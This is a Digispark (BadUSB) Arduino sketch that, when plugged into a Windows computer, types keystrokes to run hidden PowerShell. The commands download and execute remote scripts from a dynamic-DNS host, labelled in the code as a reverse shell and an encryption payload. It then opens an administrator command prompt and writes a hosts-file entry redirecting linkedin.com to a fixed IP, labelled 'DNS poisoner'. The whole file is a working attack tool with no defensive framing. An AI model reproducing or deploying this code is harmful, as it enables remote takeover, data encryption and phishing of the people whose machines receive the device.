#include "DigiKeyboard.h"

void setup() {
  // Initialize the digital pin as an output.
  pinMode(1, OUTPUT); // LED on Model A
}

void cmd_with_run() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}


void loop() {
  // Reverse Shell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -WindowStyle hidden \"IEX (New-Object Net.WebClient).DownloadString('http://projectma2022.ddns.net:443/malwareob.ps1');\""); //172.20.10.6
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  // Encryption
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -WindowStyle hidden \"IEX (New-Object Net.WebClient).DownloadString('http://projectma2022.ddns.net:443/enc2.ps1');\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  // DNS poisoner
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); // LED on <--> Action start
  cmd_with_run(); // Open CMD in Administrator Privileges using METHOD 2 (UNCOMMENT TO USE)
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("MODE CON: COLS=15 LINES=1");
  DigiKeyboard.delay(250);
  DigiKeyboard.print(F("echo. >> C:\\Windows\\System32\\drivers\\etc\\hosts"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("echo 79.153.157.12 linkedin.com >> C:\\Windows\\System32\\drivers\\etc\\hosts"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, LOW); // LED off <--> Action end
  
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}